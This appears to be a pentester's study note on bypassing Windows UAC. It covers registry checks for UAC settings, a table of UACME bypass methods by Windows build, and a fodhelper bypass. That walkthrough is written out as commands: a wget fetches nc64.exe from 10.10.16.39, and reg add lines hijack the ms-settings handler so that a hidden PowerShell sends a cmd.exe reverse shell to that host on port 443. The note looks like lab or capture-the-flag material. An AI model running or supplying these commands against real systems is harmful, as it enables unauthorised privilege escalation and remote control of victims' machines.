bypasses are mainly valuable when you:

- Have command-line only access (like through a reverse shell)
- Are operating through a web shell or other non-interactive interface
- Need to avoid UAC prompts in automated scripts/malware
### how to detect UAC blocked you:
- you get access denied despite having the right user/group  privileges with `whoami` when attempting a privEsc technique
- you got access denied when attempted to configure the system in a way
## Requirements:
- right assignment, group membership, but with medium token
### **What It’s NOT**

 UAC bypass techniques (like fodhelper) **do not grant new privileges beyond what your account is allowed**.
    
- If your account is in the **Administrators group**, UAC prevents apps from running at **high integrity** by default.
    - Fodhelper bypasses removes that barrier → **medium integrity → high integrity** (same user, just elevated token).
### bypass steps:
- confirm UAC is enabled & what security level (1 to 5)
- check windows version
- 4. [look for bypasses here](https://github.com/hfiref0x/UACME)
#### mendatory label `whoami /groups`
lists current token tier: medium. low, high
```
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288  

```
#### Confirming UAC is Enabled
```cmd-session
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```
#### Checking UAC Level
```cmd-session
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
#### 3.  Checking Windows Version

1. `get build` 
```powershell-session
[environment]::OSVersion.Version
```
2. get Version from ( right side) here:
https://en.wikipedia.org/wiki/Windows_10_version_history
![[Pasted image 20250822144215.png]]
#### list of recent UAC bypasses:
(From UACME project & commit history, focused on Win10/11)

|**ID**|**Method Name**|**Target**|**Supported Builds**|
|---|---|---|---|
|**62**|Fodhelper COM Interface|`fodhelper.exe`|Win10 RS1 (14393) – 22H2 (19045)|
|**63**|WSReset DLL Hijack|`WSReset.exe`|Win10 RS1 (14393) – 21H2 (19044)|
|**64**|DiskCleanup COM Interface|`cleanmgr.exe`|Win10 RS1 (14393) – RS6 (~18363)|
|**65**|SDCLT Auto-Elevated|`sdclt.exe`|Win10 RS1 (14393) – RS5 (~17763)|
|**69**|AppPaths Environment Injection|AutoElevated EXEs|Win10 RS4 (17134) – 21H2 (19044)|
|**78**|ComputerDefaults Hijack|`ComputerDefaults`|Win10 RS5 (17763) – 22H2 (19045)|
|**84**|CurVer Hijack for App Paths|COM Class Hijack|Win10 1903 (18362) – 22H2 (19045)|
|**90**|Newer App Paths Hijack|COM / Registry|Win10 21H1 (19043) – Win11 22000+|
|**92**|CurVer/Registry Trick (Win11)|COM / Registry|Win11 (22000) – Current|
|**93**|New UIAccess / Registry Method|UAC Registry Paths|Win11 (22621) – Current|
## UAC bypass via  foldhelper:
fodhelper runs with the same user token, but it automatically elevates to a high-integrity version of that token.
run script
```

FodhelperUACBypass -program "cmd /c start C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"`
```

2. manually

`fodhelper.exe` checks registry keys under the current user’s hive to determine **what command to execute for `ms-settings:` protocol**.

```
wget http://10.10.16.39\nc64.exe -O "C:\Users\Public\Documents\nc64.exe"
```

```javascript
 set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
 set CMD=”powershell -windowstyle hidden C:\Users\Public\Documents\nc64.exe -e cmd.exe 10.10.16.39 443"
 reg add %REG_KEY% /v “DelegateExecute” /d “” /f
reg add %REG_KEY% /d %CMD% /f
fodhelper.exe
```


` launch reverse shell with msfvenom as system`
```
- bypasses repo: [look for bypasses here](https://github.com/hfiref0x/UACME)
-  : https://github.com/hfiref0x/UACME/tree/v3.2.x

